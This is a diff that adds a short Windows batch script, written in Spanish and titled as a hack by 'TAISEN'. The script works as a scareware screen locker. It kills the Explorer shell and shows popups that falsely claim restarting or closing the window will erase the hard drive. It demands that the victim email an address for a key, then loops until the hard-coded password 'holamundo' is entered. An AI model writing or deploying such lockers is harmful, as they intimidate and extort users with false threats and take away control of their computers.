@@ -1,0 +1,23 @@
+color 0A
+@echo off
+title HACKEADO POR TAISEN
+taskkill /f /im explorer.exe 
+:bucle
+cls
+msg * LEE CON ATENCION
+msg * NO REINICIES LA COMPUTADORA
+msg * AL REINICIAR LA PC SE BORRARA EL DISCO DURO 
+msg * TAMPOCO CIERRES LA VENTANA DE ARRIBA O DE LO CONTRARIO NO PODRA RECUPERAR LA PC
+msg * ESCRIBIR AL CORREO pruebaxd@raa.com PARA OBTENER LA CLAVE QUE LE DEVOLVERA EL CONTROL DE SU PC
+echo ================================================================
+echo SI CIERRA ESTA VENTANA NO PODRA RECUPERAR SU PC
+echo ================================================================
+echo INGRESE LA CLAVE QUE LE FUE ENTREGADA POR CORREO
+echo ================================================================
+set /p pass=Escriba aqui la clave:
+if %pass%==holamundo (goto clavecorrecta) ELSE (goto bucle)
+:clavecorrecta
+echo FELICIDADES! HAS RECUPERADO TU PC
+start explorer.exe
+pause
+exit
